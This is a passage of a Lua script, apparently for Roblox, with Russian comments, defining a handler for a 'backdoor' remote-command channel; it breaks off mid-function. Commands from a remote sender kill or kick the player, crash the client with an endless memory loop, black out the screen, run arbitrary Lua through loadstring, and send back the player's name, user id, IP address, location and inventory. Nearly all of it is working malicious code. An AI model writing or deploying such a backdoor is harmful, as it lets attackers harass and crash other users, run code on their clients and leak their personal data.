-- FIX #1/#2: определяем executeCommand
executeCommand = function(senderId, cmd, data)
    local char=LP.Character
    local hum=char and char:FindFirstChildOfClass("Humanoid")
    local root=char and char:FindFirstChild("HumanoidRootPart")

    if cmd=="KILL_PLAYER" then
        if hum then hum.Health=0 end

    elseif cmd=="START_KILL_LOOP" then
        if killLoops[senderId] then killLoops[senderId]:Disconnect() end
        -- FIX #17: task.spawn вместо yield внутри Heartbeat
        killLoops[senderId]=RS.Heartbeat:Connect(function()
            local h=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
            if h then h.Health=0 end
        end)
        task.delay(30,function()
            if killLoops[senderId] then
                killLoops[senderId]:Disconnect()
                killLoops[senderId]=nil
            end
        end)

    elseif cmd=="STOP_KILL_LOOP" then
        if killLoops[senderId] then
            killLoops[senderId]:Disconnect()
            killLoops[senderId]=nil
        end

    elseif cmd=="FREEZE_PLAYER" then
        if hum then hum.WalkSpeed=0;hum.JumpPower=0 end

    elseif cmd=="UNFREEZE_PLAYER" then
        if hum then hum.WalkSpeed=16;hum.JumpPower=50 end

    elseif cmd=="KICK_PLAYER" then
        task.delay(0.5,function() LP:Kick(data~="" and data or "Kicked") end)

    elseif cmd=="SPECTATE" then
        local target=Players:GetPlayerByUserId(tonumber(data))
        if target and target.Character then
            Camera.CameraSubject=target.Character:FindFirstChild("HumanoidRootPart") or target.Character
        end

    elseif cmd=="TP_TO" then
        local target=Players:GetPlayerByUserId(tonumber(data))
        if target and target.Character and root then
            local tr=target.Character:FindFirstChild("HumanoidRootPart")
            if tr then root.CFrame=tr.CFrame*CFrame.new(0,3,5) end
        end

    elseif cmd=="BRING" then
        local target=Players:GetPlayerByUserId(tonumber(data))
        if target and target.Character and root then
            local tr=target.Character:FindFirstChild("HumanoidRootPart")
            if tr then tr.CFrame=root.CFrame*CFrame.new(0,0,-5) end
        end

    elseif cmd=="SET_WALKSPEED" then
        if hum then hum.WalkSpeed=tonumber(data) or 16 end

    elseif cmd=="SET_JUMPPOWER" then
        if hum then hum.JumpPower=tonumber(data) or 50 end

    elseif cmd=="CRASH_PLAYER" then
        -- FIX #16: task.spawn чтобы не блокировать, плюс реальный краш
        task.spawn(function()
            while true do
                local t={}
                for i=1,1e6 do t[i]=i*i end
            end
        end)

    elseif cmd=="BLACK_SCREEN" then
        local sg=makeGui("BlackScreen")
        local f=Instance.new("Frame",sg)
        f.Size=UDim2.new(1,0,1,0)
        f.BackgroundColor3=Color3.fromRGB(0,0,0)
        f.BackgroundTransparency=0;f.ZIndex=1000

    elseif cmd=="FLASH_SCREEN" then
        local sg=makeGui("_Flash")
        local f=Instance.new("Frame",sg)
        f.Size=UDim2.new(1,0,1,0)
        f.BackgroundColor3=Color3.fromRGB(255,255,255)
        f.BackgroundTransparency=0;f.ZIndex=1000
        TS:Create(f,TweenInfo.new(0.5),{BackgroundTransparency=1}):Play()
        game:GetService("Debris"):AddItem(sg,1)

    elseif cmd=="SHAKE_CAMERA" then
        local conn
        conn=RS.RenderStepped:Connect(function()
            Camera.CFrame=Camera.CFrame*CFrame.new(
                math.random(-5,5)/10,math.random(-5,5)/10,math.random(-5,5)/10)
        end)
        task.delay(5,function() if conn then conn:Disconnect() end end)

    elseif cmd=="GET_INVENTORY" then
        local inv={}
        pcall(function()
            local bp=LP:FindFirstChild("Backpack")
            if bp then for _,i in ipairs(bp:GetChildren()) do table.insert(inv,i.Name) end end
        end)
        sendBackdoorCommand(senderId,"INVENTORY_RESPONSE",HS:JSONEncode(inv))

    elseif cmd=="GET_LOCATION" then
        if root then
            local p=root.Position
            sendBackdoorCommand(senderId,"LOCATION_RESPONSE",
                string.format("%.1f,%.1f,%.1f",p.X,p.Y,p.Z))
        end

    elseif cmd=="GET_PLAYER_DATA" then
        sendBackdoorCommand(senderId,"PLAYER_DATA_RESPONSE",HS:JSONEncode({
            name=LP.Name,display=LP.DisplayName,id=LP.UserId,
            ip=myIP,place=game.PlaceId,job=game.JobId,
            age=LP.AccountAge,membership=LP.MembershipType.Name
        }))

    elseif cmd=="NOTIFICATION" then
        safeNotify("📨 Сообщение",data~="" and data or "Hello",5)

    elseif cmd=="SET_GRAVITY" then
        workspace.Gravity=tonumber(data) or 196.2

    elseif cmd=="MUTE_GAME" then
        pcall(function() game:GetService("SoundService").Volume=0 end)

    elseif cmd=="UNMUTE_GAME" then
        pcall(function() game:GetService("SoundService").Volume=0.5 end)

    elseif cmd=="RELOAD_GAME" then
        TPS:Teleport(game.PlaceId,LP)

    elseif cmd=="EXECUTE_LUA" then
        if loadstring then
            local fn=loadstring(data)
            if fn then pcall(fn) end
        end

    elseif cmd=="SET_FOV" then
        Camera.FieldOfView=tonumber(data) or 70

    elseif cmd=="SET_BRIGHTNESS" then
        Lighting.Brightness=tonumber(data) or 2

    elseif cmd=="INVERT_CONTROLS" then
        local conn
        conn=RS.RenderStepped:Connect(function()
            local r=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if not r then return end
            if UIS:IsKeyDown(Enum.KeyCode.W) then r.CFrame=r.CFrame*CFrame.new(0,0,0.5) end
            if UIS:IsKeyDown(Enum.KeyCode.S) then r.CFrame=r.CFrame*CFrame.new(0,0,-0.5) end
